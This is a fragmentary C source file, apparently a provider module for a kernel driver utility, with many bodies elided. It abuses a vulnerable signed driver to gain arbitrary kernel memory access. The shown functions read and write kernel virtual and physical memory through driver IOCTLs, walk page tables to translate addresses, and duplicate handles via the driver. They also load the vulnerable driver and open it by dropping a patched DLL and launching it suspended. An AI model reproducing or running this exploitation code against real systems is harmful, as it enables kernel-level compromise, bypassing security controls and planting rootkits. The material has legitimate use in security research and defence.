 ...
 *
 */
BOOL WINAPI KObExpReadVirtualMemory(_In_ HANDLE DeviceHandle,
                                    _In_ ULONG_PTR VirtualAddress,
                                    _In_reads_bytes_(NumberOfBytes)
                                        PVOID Buffer,
                                    _In_ ULONG NumberOfBytes) {
    return supCallDriver(DeviceHandle, IOCTL_KOBEXP_READ_VMEM, &VirtualAddress,
                         sizeof(VirtualAddress), Buffer, NumberOfBytes);
}
 ...
 *
 */
BOOL WINAPI KObExpWriteVirtualMemory(_In_ HANDLE DeviceHandle,
                                     _In_ ULONG_PTR VirtualAddress,
                                     _In_reads_bytes_(NumberOfBytes)
                                         PVOID Buffer,
                                     _In_ ULONG NumberOfBytes) {
    return supCallDriver(DeviceHandle, IOCTL_KOBEXP_WRITE_VMEM, &VirtualAddress,
                         sizeof(VirtualAddress), Buffer, NumberOfBytes);
}

#define ZdcMapMemory(PhysicalAddress, NumberOfBytes, MapForWrite)     \
    supMapPhysicalMemory(g_ZdcPhysicalMemorySection, PhysicalAddress, \
                         NumberOfBytes, MapForWrite)

#define ZdcUnmapMemory(BaseAddress) supUnmapPhysicalMemory(BaseAddress)

#define ZdcReadWritePhysicalMemory(PhysicalAddress, Buffer, NumberOfBytes,  \
                                   DoWrite)                                 \
    supReadWritePhysicalMemory(g_ZdcPhysicalMemorySection, PhysicalAddress, \
                               Buffer, NumberOfBytes, DoWrite)
 ...
 *
 */
BOOL WINAPI ZdcReadPhysicalMemory(_In_ HANDLE DeviceHandle,
                                  _In_ ULONG_PTR PhysicalAddress,
                                  _In_ PVOID Buffer,
                                  _In_ ULONG NumberOfBytes) {
    UNREFERENCED_PARAMETER(DeviceHandle);

    return ZdcReadWritePhysicalMemory(PhysicalAddress, Buffer, NumberOfBytes,
                                      FALSE);
}
 ...
 *
 */
BOOL WINAPI ZdcWritePhysicalMemory(_In_ HANDLE DeviceHandle,
                                   _In_ ULONG_PTR PhysicalAddress,
 ...
 *
 */
BOOL WINAPI ZdcQueryPML4Value(_In_ HANDLE DeviceHandle,
    ...
    *Value = 0;
    ...
    pbLowStub1M = (ULONG_PTR)ZdcMapMemory(0ULL, cbRead, FALSE);
 ...
 *
 */
BOOL WINAPI ZdcVirtualToPhysical(_In_ HANDLE DeviceHandle,
                                 _In_ ULONG_PTR VirtualAddress,
                                 _Out_ ULONG_PTR* PhysicalAddress) {
    return PwVirtualToPhysical(DeviceHandle, ZdcQueryPML4Value,
                               ZdcReadPhysicalMemory, VirtualAddress,
                               PhysicalAddress);
}
 ...
 *
 */
BOOL WINAPI ZdcReadKernelVirtualMemory(_In_ HANDLE DeviceHandle,
    ...
    bResult = ZdcVirtualToPhysical(DeviceHandle, Address, &physicalAddress);

    if (bResult) {
        bResult = ZdcReadWritePhysicalMemory(physicalAddress, Buffer,
                                             NumberOfBytes, FALSE);
    }
 ...
 *
 */
BOOL WINAPI ZdcWriteKernelVirtualMemory(_In_ HANDLE DeviceHandle,
                                        _In_ ULONG_PTR Address,
                                        _In_reads_bytes_(NumberOfBytes)
                                            PVOID Buffer,
                                        _In_ ULONG NumberOfBytes) {
 ...
 *
 */
BOOL WINAPI ZdcpOpenDriver(_In_ PVOID Param) {
    BOOL bResult = FALSE;
    ...
    dllBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI64, GetModuleHandle(NULL),
    ...
    if (supReplaceDllEntryPoint(dllBuffer, resourceSize,
                                (LPCSTR) "RegisterForProvider2", TRUE)) {
        ...
        if (supWriteBufferToFile(szFileName, dllBuffer, resourceSize, TRUE,
            ...
            if (CreateProcess(szFileName, lpCommand, NULL, NULL, TRUE,
                              CREATE_SUSPENDED, NULL, szTemp, &si, &pi)) {
 ...
 *
 */
BOOL ZdcDuplicateHandle2(_In_ HANDLE DeviceHandle,
    ...
    *TargetHandle = NULL;
    ...
    return supCallDriver(DeviceHandle, IOCTL_KANYEXP_DUPLICATE_OBJECT, &request,
                         sizeof(request), TargetHandle, sizeof(PVOID));
}
 ...
 *
 */
BOOL ZdcDuplicateHandle(_In_ HANDLE DeviceHandle,
                        _In_ HANDLE SourceProcessId,
                        _In_ HANDLE SourceProcessHandle,
                        _In_ HANDLE SourceHandle,
                        _Out_ PHANDLE TargetHandle,
 ...
 *
 */
BOOL WINAPI ZdcRegisterDriver(_In_ HANDLE DeviceHandle, _In_opt_ PVOID Param) {
    ...
    return supOpenPhysicalMemory2(DeviceHandle, callback,
 ...
 *
 */
BOOL WINAPI ZdcUnregisterDriver(_In_ HANDLE DeviceHandle) {
    UNREFERENCED_PARAMETER(DeviceHandle);
 ...
 *
 */
BOOL ZdcStartVulnerableDriver(_In_ KDU_CONTEXT* Context) {
    BOOL bLoaded = FALSE;
    NTSTATUS ntStatus;
    ...
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {
        ...
        ntStatus =
            supLoadDriverEx(lpDriverName, lpFullFileName, FALSE, NULL, NULL);
